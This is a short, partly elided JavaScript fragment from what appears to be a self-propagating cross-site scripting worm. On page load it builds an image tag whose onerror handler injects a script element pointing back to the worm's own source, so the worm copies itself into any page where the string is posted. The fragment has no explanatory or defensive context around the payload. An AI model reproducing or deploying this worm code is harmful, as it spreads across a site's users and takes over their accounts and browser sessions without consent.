window.onload=function(){
	...
	var jsCode="<img src='xxx' onerror=\"this.onerror=null;include=document.createElement(\'script\');include.id=\'worm\';include.src=\'".concat(document.getElementById("worm").src).concat("\';document.head.appendChild(include);\"/").concat(">");
